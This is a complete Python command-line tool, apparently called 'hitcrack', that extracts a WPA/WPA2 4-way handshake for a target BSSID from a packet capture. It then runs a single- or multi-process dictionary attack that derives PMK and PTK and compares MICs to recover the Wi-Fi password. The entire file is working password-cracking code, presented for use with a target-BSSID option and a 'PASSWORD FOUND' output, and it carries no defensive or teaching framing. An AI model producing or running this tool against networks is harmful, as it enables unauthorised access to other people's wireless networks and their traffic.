#!/usr/bin/env python3
# PYTHON_ARGCOMPLETE_OK

import sys
import time
import multiprocessing as mp
from multiprocessing import Pool
import hashlib
import hmac
from scapy.all import rdpcap, EAPOL, Dot11, Raw, LLC, SNAP, wrpcap
import argparse

class WPACracker:

    def __init__(self, cap_file, wordlist, bssid, output_file=None, processes=1):
        self.cap_file = cap_file
        self.wordlist = wordlist
        self.target_bssid = bssid.upper().replace("-", ":")
        self.output_file = output_file
        self.handshake_data = None
        self.passwords_tested = 0
        self.start_time = None
        if processes == 0:
            self.num_processes = mp.cpu_count()
            print(f"[*] Multi-processing mode: Using {self.num_processes} CPU cores")
        else:
            self.num_processes = 1
            print(f"[*] Single-process mode enabled")

    def load_capture(self):
        """Load and parse the capture file"""
        try:
            print(f"[*] Loading capture file: {self.cap_file}")
            self.packets = rdpcap(self.cap_file)
            print(f"[+] Loaded {len(self.packets)} packets")
            return True
        except Exception as e:
            print(f"[-] Error loading capture: {e}")
            return False

    def is_eapol_packet(self, pkt):
        """Check if packet is an EAPOL packet"""
        if pkt.haslayer(EAPOL):
            return True

        if pkt.haslayer(SNAP):
            snap = pkt[SNAP]
            if snap.code == 0x888E:
                return True

        if pkt.haslayer(Raw):
            raw_data = bytes(pkt[Raw])
            if len(raw_data) > 4 and raw_data[0] == 0x01 and raw_data[1] == 0x03:
                return True

        return False

    def extract_eapol_data(self, pkt):
        """Extract EAPOL data from packet"""
        if pkt.haslayer(EAPOL):
            eapol = pkt[EAPOL]
            if hasattr(eapol, "load"):
                return bytes(eapol.load)
            return bytes(eapol)

        if pkt.haslayer(SNAP) and pkt.haslayer(Raw):
            raw_data = bytes(pkt[Raw])
            if len(raw_data) >= 4:
                return raw_data[4:]

        return None

    def get_message_type(self, pkt):
        """Determine EAPOL message type (1-4)"""
        if not self.is_eapol_packet(pkt):
            return 0

        try:
            if not pkt.haslayer(Raw):
                if pkt.haslayer(EAPOL):
                    raw_data = bytes(pkt[EAPOL])
                else:
                    return 0
            else:
                raw_data = bytes(pkt[Raw])

            if len(raw_data) < 7:
                return 0

            if raw_data[1] != 0x03:
                return 0

            key_info = int.from_bytes(raw_data[5:7], byteorder="big")

            key_ack = bool(key_info & 0x0080)
            key_mic = bool(key_info & 0x0100)
            secure = bool(key_info & 0x0200)
            install = bool(key_info & 0x0040)

            if key_ack and not key_mic:
                return 1
            elif not key_ack and key_mic and not secure:
                return 2
            elif key_ack and key_mic and install:
                return 3
            elif not key_ack and key_mic and secure:
                return 4

        except Exception:
            pass

        return 0

    def extract_handshake_data(self, pkt, msg_num):
        """Extract critical data from handshake packet"""
        data = {}

        try:
            if pkt.haslayer(Dot11):
                data["ap_mac"] = pkt[Dot11].addr1
                data["client_mac"] = pkt[Dot11].addr2
                data["bssid"] = pkt[Dot11].addr3
            else:
                return data

            data["msg_num"] = msg_num

            eapol_data = self.extract_eapol_data(pkt)
            if not eapol_data:
                return data

            if len(eapol_data) >= 49:
                data["nonce"] = eapol_data[17:49]
            else:
                data["nonce"] = b"\x00" * 32

            if len(eapol_data) >= 97:
                data["mic"] = eapol_data[81:97]
            else:
                data["mic"] = b"\x00" * 16

            if pkt.haslayer(Raw):
                raw_bytes = bytes(pkt[Raw])
                data["eapol_frame"] = raw_bytes
            else:
                data["eapol_frame"] = eapol_data

            data["packet"] = pkt

        except Exception as e:
            print(f"[-] Error extracting data: {e}")
        return data

    def find_handshake(self):
        """Find and extract valid 4-way handshake for target BSSID"""
        print(f"[*] Searching for handshake with BSSID: {self.target_bssid}")

        eapol_count = 0
        dot11_count = 0

        for pkt in self.packets:
            if pkt.haslayer(Dot11):
                dot11_count += 1
            if self.is_eapol_packet(pkt):
                eapol_count += 1

        print(f"[+] Found {dot11_count} 802.11 packets")
        print(f"[+] Found {eapol_count} EAPOL packets")

        eapol_packets = []
        handshake_packets = []
        for pkt in self.packets:
            if self.is_eapol_packet(pkt) and pkt.haslayer(Dot11):
                msg_type = self.get_message_type(pkt)

                addr1 = pkt[Dot11].addr1.upper() if hasattr(pkt[Dot11], "addr1") else ""
                addr2 = pkt[Dot11].addr2.upper() if hasattr(pkt[Dot11], "addr2") else ""
                addr3 = pkt[Dot11].addr3.upper() if hasattr(pkt[Dot11], "addr3") else ""

                if msg_type > 0 and self.target_bssid in (addr1, addr2, addr3):
                    data = self.extract_handshake_data(pkt, msg_type)
                    if data:
                        eapol_packets.append(data)
                        handshake_packets.append(pkt)

        if not eapol_packets:
            print("[-] No EAPOL packets found for target BSSID")
            return False

        print(f"[+] Extracted {len(eapol_packets)} EAPOL packets")

        messages = {}
        for pkt_data in eapol_packets:
            msg_num = pkt_data["msg_num"]
            if msg_num not in messages:
                messages[msg_num] = pkt_data

        print(f"[+] Handshake messages found: {sorted(messages.keys())}")

        anonce = None

        if 1 in messages:
            anonce = messages[1]["nonce"]
        elif 3 in messages:
            anonce = messages[3]["nonce"]
        else:
            print("[-] No ANonce found (need Message 1 or 3)")
            return False

        if 2 not in messages:
            print("[-] Missing Message 2 (required for cracking)")
            return False

        msg2 = messages[2]

        self.handshake_data = {
            "ssid": self.extract_ssid(),
            "ap_mac": msg2["ap_mac"].replace(":", "").lower(),
            "client_mac": msg2["client_mac"].replace(":", "").lower(),
            "anonce": anonce,
            "snonce": msg2["nonce"],
            "mic": msg2["mic"],
            "eapol_frame": msg2["eapol_frame"],
        }

        print(f"\n[+] Handshake captured successfully!")
        print(f"    SSID:       {self.handshake_data['ssid']}")
        print(f"    AP MAC:     {self.handshake_data['ap_mac']}")
        print(f"    Client MAC: {self.handshake_data['client_mac']}")

        if self.output_file and handshake_packets:
            try:
                wrpcap(self.output_file, handshake_packets)
                print(f"[+] Saved {len(handshake_packets)} handshake packets to {self.output_file}")
            except Exception as e:
                print(f"[-] Failed to save handshake packets: {e}")

        return True

    def extract_ssid(self):
        """Extract SSID from beacon frames"""
        for pkt in self.packets:
            if pkt.haslayer(Dot11):
                if pkt.type == 0 and pkt.subtype == 8:
                    try:
                        if (
                            hasattr(pkt, "addr3")
                            and pkt.addr3.upper() == self.target_bssid
                        ):
                            if hasattr(pkt, "info"):
                                ssid = pkt.info.decode("utf-8", errors="ignore")
                                if ssid:
                                    return ssid
                    except Exception:
                        pass
        return "Unknown"

    @staticmethod
    def pbkdf2_sha1(password, ssid, iterations=4096):
        """Derive PMK (Pairwise Master Key) using PBKDF2-HMAC-SHA1"""
        from hashlib import pbkdf2_hmac
        return pbkdf2_hmac(
            "sha1", password.encode("utf-8"), ssid.encode("utf-8"), iterations, 32
        )

    @staticmethod
    def calculate_ptk(pmk, ap_mac, client_mac, anonce, snonce):
        """Calculate PTK (Pairwise Transient Key) from PMK"""
        ap_mac_bytes = bytes.fromhex(ap_mac)
        client_mac_bytes = bytes.fromhex(client_mac)

        ptk_salt = (
            min(ap_mac_bytes, client_mac_bytes)
            + max(ap_mac_bytes, client_mac_bytes)
            + min(anonce, snonce)
            + max(anonce, snonce)
        )

        pke = b"Pairwise key expansion"
        i = 0
        ptk = b""

        while len(ptk) < 64:
            msg = pke + b"\x00" + ptk_salt + bytes([i])
            hmac_sha1 = hmac.new(pmk, msg, hashlib.sha1)
            i += 1
            ptk += hmac_sha1.digest()

        return ptk[:64]

    @staticmethod
    def verify_mic(ptk, eapol_frame, captured_mic, password=None, verbose=False):
        """Verify if the calculated MIC matches the captured MIC"""
        kck = ptk[:16]

        eapol_for_mic = bytearray(eapol_frame)

        if len(eapol_for_mic) >= 97:
            eapol_for_mic[81:97] = b"\x00" * 16
        else:
            return False

        calculated_mic = hmac.new(kck, bytes(eapol_for_mic), hashlib.sha1).digest()[:16]
        
        if verbose and password:
            print(f"\n[*] MIC Verification for password: '{password}'")
            print(f"    Captured MIC:   {captured_mic.hex()}")
            print(f"    Calculated MIC: {calculated_mic.hex()}")
            print(f"    Match: {'✓ YES' if calculated_mic == captured_mic else '✗ NO'}")

        return calculated_mic == captured_mic

    @staticmethod
    def test_password(password, handshake_data):
        """Test a single password against the handshake"""
        try:
            pmk = WPACracker.pbkdf2_sha1(password, handshake_data["ssid"])

            ptk = WPACracker.calculate_ptk(
                pmk,
                handshake_data["ap_mac"],
                handshake_data["client_mac"],
                handshake_data["anonce"],
                handshake_data["snonce"],
            )

            if WPACracker.verify_mic(
                ptk, handshake_data["eapol_frame"], handshake_data["mic"], password, verbose=True
            ):
                return password

        except Exception:
            pass

        return None

    def get_kps(self):
        """Calculate keys per second"""
        if not self.start_time:
            return 0
        elapsed = time.time() - self.start_time
        if elapsed == 0:
            return 0
        return self.passwords_tested / elapsed

    def crack(self):
        """Main cracking function - dictionary attack"""
        if not self.handshake_data:
            print("[-] No valid handshake found")
            return False

        print(f"\n{'='*70}")
        print(f"[*] Starting Dictionary Attack")
        print(f"{'='*70}")
        print(f"[*] Wordlist: {self.wordlist}")

        try:
            with open(self.wordlist, "r", encoding="utf-8", errors="ignore") as f:
                wordlist_lines = f.readlines()

            total_passwords = len(wordlist_lines)
            print(f"[*] Loaded {total_passwords} passwords")
            print(f"{'='*70}\n")

        except Exception as e:
            print(f"[-] Error reading wordlist: {e}")
            return False

        self.start_time = time.time()

        for line in wordlist_lines:
            password = line.strip()

            if not password or len(password) < 8:
                continue

            self.passwords_tested += 1

            result = self.test_password(password, self.handshake_data)
            if result:
                elapsed = time.time() - self.start_time
                print(f"\n{'='*70}")
                print(f"[+] ✓ PASSWORD FOUND: {password}")
                print(f"{'='*70}")
                print(f"[+] Time elapsed:    {elapsed:.2f} seconds")
                print(f"[+] Passwords tested: {self.passwords_tested}")
                print(f"[+] Average speed:    {self.get_kps():.2f} keys/sec")
                print(f"{'='*70}")
                return True

            if self.passwords_tested % 10 == 0:
                kps = self.get_kps()
                progress = (self.passwords_tested / total_passwords) * 100
                elapsed = time.time() - self.start_time
                print(
                    f"\r[*] Progress: {self.passwords_tested}/{total_passwords} ({progress:.1f}%) | "
                    f"Speed: {kps:.2f} keys/sec | Time: {elapsed:.1f}s",
                    end="",
                    flush=True,
                )

        elapsed = time.time() - self.start_time
        print(f"\n\n{'='*70}")
        print(f"[-] Password not found in wordlist")
        print(f"{'='*70}")
        print(f"[*] Total passwords tested: {self.passwords_tested}")
        print(f"[*] Total time elapsed:     {elapsed:.2f} seconds")
        print(f"[*] Average speed:          {self.get_kps():.2f} keys/sec")
        print(f"{'='*70}")
        
        return False

    def crack_parallel(self):
        """Main parallel cracking function using multiprocessing"""
        if not self.handshake_data:
            print("[-] No valid handshake found")
            return False

        print(f"\n{'='*70}")
        print(f"[*] Starting Parallel Dictionary Attack")
        print(f"{'='*70}")
        print(f"[*] Wordlist:  {self.wordlist}")
        print(f"[*] CPU Cores: {self.num_processes}")

        try:
            with open(self.wordlist, "r", encoding="utf-8", errors="ignore") as f:
                passwords = [
                    line.strip()
                    for line in f
                    if line.strip() and len(line.strip()) >= 8
                ]

            total_passwords = len(passwords)
            print(f"[*] Loaded {total_passwords} passwords")
            print(f"{'='*70}\n")

        except Exception as e:
            print(f"[-] Error reading wordlist: {e}")
            return False

        self.start_time = time.time()

        with Pool(processes=self.num_processes) as pool:
            tasks = [(password, self.handshake_data) for password in passwords]

            results_iter = pool.starmap(
                WPACracker.test_password, tasks, chunksize=50
            )

            for i, result in enumerate(results_iter, 1):
                if result is not None:
                    elapsed = time.time() - self.start_time
                    kps = i / elapsed

                    print(f"\n{'='*70}")
                    print(f"[+] ✓ PASSWORD FOUND: {result}")
                    print(f"{'='*70}")
                    print(f"[+] Time elapsed:     {elapsed:.2f} seconds")
                    print(f"[+] Passwords tested: {i}")
                    print(f"[+] Average speed:    {kps:.2f} keys/sec")
                    print(f"{'='*70}")

                    pool.terminate()
                    pool.join()
                    return True

                if i % 100 == 0:
                    progress = (i / total_passwords) * 100
                    elapsed = time.time() - self.start_time
                    kps = i / elapsed if elapsed > 0 else 0

                    print(
                        f"\r[*] Progress: {i}/{total_passwords} ({progress:.1f}%) | "
                        f"Speed: {kps:.2f} keys/sec | Time: {elapsed:.1f}s",
                        end="",
                        flush=True,
                    )

        elapsed = time.time() - self.start_time
        print(f"\n\n{'='*70}")
        print(f"[-] Password not found in wordlist")
        print(f"{'='*70}")
        print(f"[*] Total passwords tested: {total_passwords}")
        print(f"[*] Total time:             {elapsed:.2f} seconds")
        print(f"[*] Average speed:          {total_passwords/elapsed:.2f} keys/sec")
        print(f"{'='*70}")
        return False


def main():
    art = r"""
   /$$       /$$   /$$                                            /$$      
| $$      |__/  | $$                                           | $$      
| $$$$$$$  /$$ /$$$$$$    /$$$$$$$  /$$$$$$  /$$$$$$   /$$$$$$$| $$   /$$
| $$__  $$| $$|_  $$_/   /$$_____/ /$$__  $$|____  $$ /$$_____/| $$  /$$/
| $$  \ $$| $$  | $$    | $$      | $$  \__/ /$$$$$$$| $$      | $$$$$$/ 
| $$  | $$| $$  | $$ /$$| $$      | $$      /$$__  $$| $$      | $$_  $$ 
| $$  | $$| $$  |  $$$$/|  $$$$$$$| $$     |  $$$$$$$|  $$$$$$$| $$ \  $$
|__/  |__/|__/   \___/   \_______/|__/      \_______/ \_______/|__/  \__/
"""
    parser = argparse.ArgumentParser(
        prog="hitcrack",
        description=art
        + "\n\nCapture and analyze WiFi handshakes for WPA/WPA2 cracking",
        epilog="@By NS-Guys",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    parser.add_argument(
        "-c",
        "--capture",
        required=True,
        help="Path to .cap file containing handshake",
        metavar="FILE",
    )
    parser.add_argument(
        "-w", "--wordlist", required=True, help="Path to wordlist file", metavar="FILE"
    )
    parser.add_argument(
        "-b",
        "--bssid",
        required=True,
        help="Target BSSID (e.g., AA:BB:CC:DD:EE:FF)",
        metavar="BSSID",
    )
    parser.add_argument(
        "-o",
        "--output",
        help="Save handshake packets to .cap file for later use",
        metavar="FILE",
    )
    parser.add_argument(
        "-p",
        "--processes",
        help="Use 0 for max CPU cores (parallel), or 1 for single-process (default)",
        type=int,
        choices=[0, 1],
        default=1,
        metavar="MODE",
    )

    args = parser.parse_args()

    cracker = WPACracker(
        args.capture, args.wordlist, args.bssid, args.output, args.processes
    )

    if not cracker.load_capture():
        sys.exit(1)

    if not cracker.find_handshake():
        print("[-] Failed to find valid handshake")
        sys.exit(1)

    if cracker.num_processes == 1:
        success = cracker.crack()
    else:
        success = cracker.crack_parallel()

    if not success:
        sys.exit(1)


if __name__ == "__main__":
    mp.freeze_support()
    main()